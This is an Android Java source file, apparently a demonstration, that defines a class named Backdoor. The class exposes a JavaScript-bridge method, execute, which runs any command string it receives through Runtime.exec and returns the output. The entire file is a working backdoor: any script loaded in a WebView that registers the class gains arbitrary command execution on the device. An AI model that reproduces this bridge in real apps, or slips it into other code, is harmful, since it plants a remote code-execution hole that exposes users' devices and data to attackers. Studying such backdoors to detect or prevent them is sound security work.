package com.example.javascriptbridgebackdoor;

import android.webkit.JavascriptInterface;
import java.io.BufferedReader;
import java.io.InputStreamReader;

final class Backdoor {

    @JavascriptInterface
    public String execute(String cmd)
    {
        StringBuffer output = new StringBuffer();
        Process p;

        try
        {
            p = Runtime.getRuntime().exec(cmd);
            p.waitFor();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = "";

            while((line=reader.readLine())!=null)
            {
              output.append(line+"\n");
            }

        }
        catch(Exception e)
        {
            e.printStackTrace();
        }
        String response = output.toString();


        return response;
    }
}
